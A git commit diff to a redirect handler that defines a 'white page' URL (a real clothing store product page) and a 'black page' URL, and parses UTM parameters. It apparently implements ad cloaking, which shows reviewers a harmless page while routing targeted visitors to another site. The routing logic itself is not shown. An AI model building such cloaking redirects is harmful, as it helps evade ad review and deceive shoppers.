43b5bd65ec162e2f4120be36d66d96e09cda6db9
ahmadfarhanwork <ahmadfarhanwork@gmail.com>
2025-11-01 02:18:02 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://littlefrenchheart.com/product/misha-puff-baby-hooded-popcorn-cardigan-patina/";
+    const whitePageURL = "https://www.tartine-et-chocolat.com/en/products/manteau-gris-fonce-laine";
     const blackPageURL = "https://luvcshap.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
